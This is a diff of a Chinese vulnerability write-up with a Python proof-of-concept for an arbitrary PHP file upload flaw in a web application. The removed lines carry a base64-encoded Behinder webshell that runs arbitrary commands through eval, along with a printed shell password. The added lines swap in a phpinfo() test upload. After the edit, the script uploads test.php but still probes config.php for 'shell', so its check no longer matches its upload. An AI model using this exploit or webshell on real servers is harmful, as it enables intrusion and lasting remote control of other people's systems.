@@ -14,7 +14,7 @@
 
 登录页面如下
 
-![](image/hx-1.png)
+![](http://wikioss.peiqi.tech/vuln/hx-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 发送请求包如下
 
@@ -31,7 +31,7 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
 Content-Length: 182
 
 ------WebKitFormBoundaryfcKRltGv
-Content-Disposition: form-data; name="file"; filename="peiqi.php"
+Content-Disposition: form-data; name="file"; filename="test.php"
 Content-Type: image/avif
 
 <?php phpinfo(); ?>
@@ -42,10 +42,10 @@ Content-Type: image/avif
 访问
 
 ```
-http://xxx.xx.xxx.xxx/Upload/1/peiqi.php
+http://xxx.xx.xxx.xxx/Upload/1/test.php
 ```
 
-![](image/hx-2.png)
+![](http://wikioss.peiqi.tech/vuln/hx-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -72,7 +72,7 @@ def POC_1(target_url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
     }
-    data = base64.b64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJwZWlxaS5waHAiCkNvbnRlbnQtVHlwZTogaW1hZ2UvYXZpZgoKPD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwoJZWNobyAibm9fc2hlbGwiOwogICAgJGtleT0iZWRmNmJkNWNjMDBiYmM3NiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlmY0tSbHRHdi0t")
+    data = base64.b64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
@@ -80,8 +80,7 @@ def POC_1(target_url):
             webshell_url = target_url + "/Upload/test/config.php"
             response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
             if "shell" in response.text and response.status_code == 200:
-                print("\033[32m[o] 目标 {}存在漏洞 ,成功上传冰蝎木马 config.php\n[o] 路径为 {}/Upload/test/config.php\033[0m".format(target_url, target_url))
-                print("\033[32m[o] 密码为: PeiQi_webshell \033[0m")
+                print("\033[32m[o] 目标 {}存在漏洞 config.php\n[o] 路径为 {}/Upload/test/config.php\033[0m".format(target_url, target_url))
             else:
                 print("\033[31m[x] 请求失败 \033[0m")
                 sys.exit(0)
@@ -98,4 +97,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/hx-3.png)
+![](http://wikioss.peiqi.tech/vuln/hx-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
